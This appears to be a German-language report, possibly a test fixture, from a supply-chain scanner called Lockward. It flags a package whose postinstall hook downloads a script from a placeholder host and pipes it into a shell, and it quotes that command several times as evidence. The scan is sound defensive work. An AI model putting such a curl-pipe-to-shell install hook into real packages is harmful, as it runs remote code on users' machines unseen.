## Lockward

**Ziel:** `{root}`

**Zeitpunkt:** 2026-10-12T00:00:00Z

**Score:** 50 (hoch)

**Gate:** Warnung · Exit 1 · Modus warn

### Warum

- Paket mini-app@1.0.0 Hook `postinstall`: der Hook spricht mit dem Netzwerk oder lädt Daten herunter. Beleg: `curl https://example.invalid/setup.sh | sh`.
- Paket mini-app@1.0.0 Hook `postinstall`: der Hook leitet einen Download in eine Shell. Beleg: `curl https://example.invalid/setup.sh | sh`.
- **install_scripts:** Install-Hook `postinstall` in mini-app@1.0.0 ist nicht auf der Allowlist.
- **no_outbound_build:** Hook `postinstall` in mini-app@1.0.0 spricht während der Installation mit dem Netzwerk (LW-H003).
- **no_outbound_build:** Hook `postinstall` in mini-app@1.0.0 spricht während der Installation mit dem Netzwerk (LW-H004).

### Install-Hooks

- `mini-app@1.0.0` `postinstall`: `curl https://example.invalid/setup.sh | sh`

### Advisories

Keine bekannten Advisories im Cache.

### Hinweise

- new_dependencies: keine Baseline übergeben, die Regel ist für diesen Lauf inaktiv.
